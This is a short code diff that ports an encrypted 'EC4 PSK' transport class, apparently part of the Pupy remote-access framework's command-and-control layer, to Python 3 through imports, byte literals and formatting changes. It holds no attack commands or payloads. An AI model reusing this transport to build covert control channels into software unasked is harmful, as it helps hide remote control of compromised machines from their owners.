@@ -1,6 +1,10 @@
 # -*- coding: utf-8 -*-
 
 """ EC4 PSK transport """
+from __future__ import absolute_import
+from __future__ import division
+from __future__ import print_function
+from __future__ import unicode_literals
 
 __all__ = ['EC4TransportServer', 'EC4TransportClient']
 
@@ -13,9 +17,13 @@ import struct
 import time
 import random
 
+
 class EC4Transport(BasePupyTransport):
 
-    __slots__ = ('encryptor', 'decryptor', 'up_buffer')
+    __slots__ = (
+        'encoder', 'encryptor',
+        'decryptor', 'up_buffer'
+    )
 
     privkey = None
     pubkey  = None
@@ -72,8 +80,8 @@ class EC4Transport(BasePupyTransport):
 
         # https://wikileaks.org/ciav7p1/cms/files/NOD%20Cryptographic%20Requirements%20v1.1%20TOP%20SECRET.pdf
         # Okay...
-        self.encryptor.encrypt('\x00'*3072)
-        self.decryptor.decrypt('\x00'*3072)
+        self.encryptor.encrypt(b'\x00'*3072)
+        self.decryptor.decrypt(b'\x00'*3072)
         return True
 
     def downstream_recv(self, data):
@@ -94,8 +102,10 @@ class EC4Transport(BasePupyTransport):
         else:
             data.write_to(self.up_buffer)
 
+
 class EC4TransportServer(EC4Transport):
     __slots__ = ()
+
 
 class EC4TransportClient(EC4Transport):
     __slots__ = ()
